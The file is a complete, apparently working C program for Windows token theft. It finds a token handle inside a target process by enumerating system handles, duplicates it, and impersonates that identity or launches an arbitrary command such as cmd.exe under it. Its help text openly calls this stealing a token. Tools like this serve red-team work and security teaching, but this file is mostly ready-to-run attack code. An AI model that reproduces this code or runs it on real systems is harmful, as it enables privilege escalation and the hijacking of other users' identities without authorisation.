/*
 * impersonate.c
 *
 * Demonstrates token impersonation by targeting a specific PID.
 *
 * Since SeDebugPrivilege does NOT bypass the token object's DACL,
 * we cannot use OpenProcessToken/NtOpenProcessToken to get TOKEN_DUPLICATE.
 * Instead we:
 *   1. OpenProcess with PROCESS_DUP_HANDLE (SeDebugPrivilege bypasses process DACL)
 *   2. Enumerate system handles via NtQuerySystemInformation to find a token
 *      handle inside the target process
 *   3. DuplicateHandle to copy it into our process
 *   4. DuplicateTokenEx to create an impersonation token
 *   5. ImpersonateLoggedOnUser
 *
 * Usage:
 *   impersonate.exe <PID>
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-gcc -o impersonate.exe impersonate.c -ladvapi32
 */

#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>

/* ── ntdll types ───────────────────────────────────────────────────── */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16

typedef struct {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    PVOID       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG                NumberOfHandles;
    SYSTEM_HANDLE_ENTRY  Handles[1];
} SYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    ULONG, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *NtQueryObject_t)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static NtQuerySystemInformation_t pNtQuerySystemInformation;
static NtQueryObject_t pNtQueryObject;

static void init_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    pNtQuerySystemInformation = (NtQuerySystemInformation_t)
        GetProcAddress(ntdll, "NtQuerySystemInformation");
    pNtQueryObject = (NtQueryObject_t)
        GetProcAddress(ntdll, "NtQueryObject");
}

/* ── helpers ───────────────────────────────────────────────────────── */

static void print_current_identity(const char *label) {
    HANDLE tok;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &tok)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
            printf("[%s] Could not open token: error %lu\n", label, GetLastError());
            return;
        }
    }

    DWORD len = 0;
    GetTokenInformation(tok, TokenUser, NULL, 0, &len);
    TOKEN_USER *tu = malloc(len);
    if (tu && GetTokenInformation(tok, TokenUser, tu, len, &len)) {
        char name[256] = {0}, domain[256] = {0};
        DWORD nlen = sizeof(name), dlen = sizeof(domain);
        SID_NAME_USE use;
        char *sid_str = NULL;

        LookupAccountSidA(NULL, tu->User.Sid, name, &nlen, domain, &dlen, &use);
        ConvertSidToStringSidA(tu->User.Sid, &sid_str);
        printf("[%s] %s\\%s (%s)\n", label, domain, name, sid_str ? sid_str : "?");
        if (sid_str) LocalFree(sid_str);
    }
    free(tu);
    CloseHandle(tok);
}

static BOOL enable_priv(const char *priv_name) {
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        CloseHandle(tok);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    BOOL ok = GetLastError() == ERROR_SUCCESS;
    CloseHandle(tok);
    return ok;
}

/* Check if a duplicated handle is a Token object */
static BOOL is_token_handle(HANDLE h) {
    /* Try a token-specific query. If it works, it's a token. */
    TOKEN_TYPE tt;
    DWORD len;
    return GetTokenInformation(h, TokenType, &tt, sizeof(tt), &len);
}

int main(int argc, char *argv[]) {
    if (argc < 2 || strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
        printf("impersonate - Steal a token from a target process and impersonate or launch a command\n\n"
               "Usage: impersonate.exe <PID> [command]\n\n"
               "Modes:\n"
               "  impersonate.exe <PID>          Demo mode: impersonate, print identity, revert\n"
               "  impersonate.exe <PID> <cmd>    Launch <cmd> as the stolen identity\n\n"
               "Options:\n"
               "  -h, --help                     Show this help\n\n"
               "Examples:\n"
               "  impersonate.exe 928            Impersonate PID 928's token (demo)\n"
               "  impersonate.exe 928 cmd.exe    Launch cmd.exe as PID 928's identity\n"
               "  impersonate.exe 928 calc.exe   Launch calc.exe as PID 928's identity\n\n"
               "Notes:\n"
               "  Requires SeDebugPrivilege to target processes owned by other users.\n"
               "  Requires SeImpersonatePrivilege to impersonate tokens at higher integrity.\n"
               "  Tokens matching the caller's identity are skipped automatically.\n");
        return (argc < 2) ? 1 : 0;
    }

    DWORD pid = strtoul(argv[1], NULL, 10);
    const char *cmd = (argc > 2) ? argv[2] : NULL;

    init_ntdll();
    if (!pNtQuerySystemInformation) {
        fprintf(stderr, "Failed to resolve NtQuerySystemInformation\n");
        return 1;
    }

    enable_priv("SeDebugPrivilege");
    enable_priv("SeImpersonatePrivilege");

    print_current_identity("BEFORE");

    /* Gate 1: open the target process with DUP_HANDLE rights */
    printf("\n[*] Opening process %lu...\n", pid);
    HANDLE proc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!proc) {
        fprintf(stderr, "    OpenProcess FAILED: error %lu\n", GetLastError());
        return 1;
    }
    printf("    OpenProcess OK (PROCESS_DUP_HANDLE)\n");

    /* Gate 2: enumerate system handles, find a token handle in the target,
       and duplicate it into our process */
    printf("[*] Enumerating system handles to find token in PID %lu...\n", pid);

    ULONG bufsize = 1024 * 1024;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    NTSTATUS status;

    do {
        shi = realloc(shi, bufsize);
        status = pNtQuerySystemInformation(SystemHandleInformation, shi, bufsize, NULL);
        if (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH)
            bufsize *= 2;
    } while (status == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "    NtQuerySystemInformation FAILED: 0x%08lx\n", status);
        free(shi);
        CloseHandle(proc);
        return 1;
    }

    /* Get our own SID so we can skip tokens that match it */
    PSID our_sid = NULL;
    {
        HANDLE our_tok;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &our_tok)) {
            DWORD len2 = 0;
            GetTokenInformation(our_tok, TokenUser, NULL, 0, &len2);
            TOKEN_USER *tu = malloc(len2);
            if (tu && GetTokenInformation(our_tok, TokenUser, tu, len2, &len2)) {
                DWORD slen = GetLengthSid(tu->User.Sid);
                our_sid = malloc(slen);
                if (our_sid) CopySid(slen, our_sid, tu->User.Sid);
            }
            free(tu);
            CloseHandle(our_tok);
        }
    }

    HANDLE stolen_token = NULL;
    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
        if (e->ProcessId != pid)
            continue;

        HANDLE dup = NULL;
        if (!DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
                             GetCurrentProcess(), &dup,
                             TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                             FALSE, 0)) {
            continue;
        }

        if (!is_token_handle(dup)) {
            CloseHandle(dup);
            continue;
        }

        /* Check token user — skip if it matches our own identity */
        DWORD tlen = 0;
        GetTokenInformation(dup, TokenUser, NULL, 0, &tlen);
        TOKEN_USER *tu = malloc(tlen);
        if (tu && GetTokenInformation(dup, TokenUser, tu, tlen, &tlen)) {
            char name[256] = {0}, domain[256] = {0};
            DWORD nlen = sizeof(name), dlen = sizeof(domain);
            SID_NAME_USE use;
            LookupAccountSidA(NULL, tu->User.Sid, name, &nlen, domain, &dlen, &use);

            if (our_sid && EqualSid(tu->User.Sid, our_sid)) {
                printf("    Handle 0x%x -> %s\\%s (same as caller, skipping)\n",
                       e->Handle, domain, name);
                free(tu);
                CloseHandle(dup);
                continue;
            }
            printf("    Handle 0x%x -> %s\\%s\n", e->Handle, domain, name);
        }
        free(tu);

        stolen_token = dup;
        break;
    }
    free(shi);
    free(our_sid);

    if (!stolen_token) {
        fprintf(stderr, "    No token handle found in target process\n");
        CloseHandle(proc);
        return 1;
    }
    printf("    DuplicateHandle OK\n");

    /* Gate 3: duplicate as primary token (for CreateProcessWithTokenW)
       and impersonation token (for demo mode) */
    HANDLE primary_token;
    printf("[*] Creating primary token...\n");
    if (!DuplicateTokenEx(stolen_token, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &primary_token)) {
        fprintf(stderr, "    DuplicateTokenEx FAILED: error %lu\n", GetLastError());
        CloseHandle(stolen_token);
        CloseHandle(proc);
        return 1;
    }
    printf("    DuplicateTokenEx OK\n");

    if (cmd) {
        /* Launch a process with the stolen token */
        STARTUPINFOW si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi = {0};

        /* Convert command to wide string */
        int wlen = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
        WCHAR *wcmd = malloc(wlen * sizeof(WCHAR));
        MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);

        printf("[*] Launching: %s\n", cmd);
        if (!CreateProcessWithTokenW(primary_token, 0, NULL, wcmd,
                                     CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            fprintf(stderr, "    CreateProcessWithTokenW FAILED: error %lu\n", GetLastError());
            free(wcmd);
            CloseHandle(primary_token);
            CloseHandle(stolen_token);
            CloseHandle(proc);
            return 1;
        }
        printf("    Launched PID %lu as stolen identity\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(wcmd);
    } else {
        /* Demo mode: impersonate, print identity, revert */
        HANDLE imp_token;
        DuplicateTokenEx(stolen_token, MAXIMUM_ALLOWED, NULL,
                         SecurityImpersonation, TokenImpersonation, &imp_token);

        printf("[*] Impersonating...\n");
        if (!ImpersonateLoggedOnUser(imp_token)) {
            fprintf(stderr, "    ImpersonateLoggedOnUser FAILED: error %lu\n", GetLastError());
            CloseHandle(imp_token);
            CloseHandle(primary_token);
            CloseHandle(stolen_token);
            CloseHandle(proc);
            return 1;
        }
        printf("    ImpersonateLoggedOnUser OK\n\n");

        print_current_identity("DURING");

        RevertToSelf();
        printf("\n");
        print_current_identity("AFTER ");
        CloseHandle(imp_token);
    }

    CloseHandle(primary_token);
    CloseHandle(stolen_token);
    CloseHandle(proc);
    return 0;
}
